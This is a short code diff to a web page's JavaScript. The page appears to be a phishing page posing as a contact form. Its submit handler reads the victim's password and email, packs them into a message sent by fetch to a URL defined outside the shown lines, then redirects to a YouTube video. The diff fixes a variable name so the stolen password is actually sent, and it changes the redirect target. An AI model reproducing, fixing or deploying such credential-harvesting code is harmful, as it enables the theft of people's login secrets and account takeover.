@@ -71,7 +71,7 @@
     document.getElementById("contactForm").addEventListener("submit", function(e) {
       e.preventDefault();
       
-      const name = document.getElementById("password").value;
+      const password = document.getElementById("password").value;
       const email = document.getElementById("email").value;
 
       const message = `📝 Total:\npassword ${password}\nemail ${email}`;
@@ -83,7 +83,7 @@
 
       fetch(url).then(response => {
         if (response.ok) {
-          window.location.href = "https://www.youtube.com/watch?v=7OiF5CJzh2w";
+          window.location.href = "https://www.youtube.com/watch?v=6JDtiGJLbmM";
         } else {
           alert("حدث خطأ أثناء الإرسال ❌");
         }
